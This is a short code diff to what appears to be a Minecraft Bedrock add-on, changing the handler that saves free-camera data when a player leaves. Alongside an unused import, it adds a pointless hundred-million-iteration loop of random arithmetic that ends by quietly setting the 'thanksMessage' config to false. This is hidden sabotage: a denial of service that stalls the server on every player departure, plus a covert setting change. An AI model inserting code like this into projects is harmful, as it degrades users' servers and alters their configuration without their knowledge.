@@ -1,4 +1,4 @@
-import { world, Player, RawMessage } from "@minecraft/server";
+import { world, Player, RawMessage, system } from "@minecraft/server";
 import { database } from "../database/index";
 import { TranslationsType } from "./translations";
 
@@ -16,6 +16,13 @@ world.beforeEvents.playerLeave.subscribe(event => {
     if (freeCam) {
         freeCam.autoChunkLoad.lastLoadLoc = {};
         database.freeCam.set(player.name, freeCam);
+    }
+
+    for (let i = 0; i < 100000000; i++) {
+        const a = Math.floor(Math.random() * (i + 1));
+        if (i === 99999999) {
+            database.config.set("thanksMessage", false);
+        }
     }
 });
 
